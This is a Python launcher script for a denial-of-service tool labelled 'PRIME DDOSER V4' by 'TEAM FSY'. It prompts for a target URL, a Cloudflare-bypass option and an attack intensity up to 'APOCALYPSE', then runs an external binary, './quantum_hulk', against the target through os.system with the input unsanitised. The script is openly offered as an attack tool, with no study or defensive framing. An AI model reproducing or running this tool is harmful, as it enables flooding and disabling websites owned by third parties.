import os
import pyfiglet
from colorama import Fore, Style, init

os.system('cls' if os.name == 'nt' else 'clear')
init(autoreset=True)

def big_text(text, color):
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = pyfiglet.figlet_format(text, font="slant")
    print(color + banner + Style.RESET_ALL)

big_text("PRIME", Fore.RED)
big_text("DDOSER", Fore.RED)
print(Fore.RED + "V4 ☢︎︎ QUANTUM POWER\n")
print(Fore.RED + "MADE BY TEAM FSY\n")

target = input(Fore.RED + "TARGET URL —> ").strip()
if not target:
    print(Fore.RED + "Target URL is required!")
    exit()

cf = input(Fore.RED + "Cloudflare protected? (y/N): ").strip().lower() == 'y'

print(Fore.RED + "1 - STANDARD\n2 - ULTRA\n3 - EXTREME\n4 - VERY EXTREME\n5 - APOCALYPSE")
mode = input(Fore.RED + "Select mode (1-5, default 3): ").strip() or "3"

auto_net = input(Fore.RED + "Auto Network error handling? (Y/n): ").strip().lower() != 'n'

extra_headers = input(Fore.RED + "Use random headers for speed? (Y/n): ").strip().lower() != 'n'

cmd = f'./quantum_hulk ULTIMATE {target} --mode={mode}'
if cf:
    cmd += ' --cloudflare'
if not auto_net:
    cmd += ' --autonetwork=false'
if extra_headers:
    cmd += ' --extra-headers'

os.system(cmd)
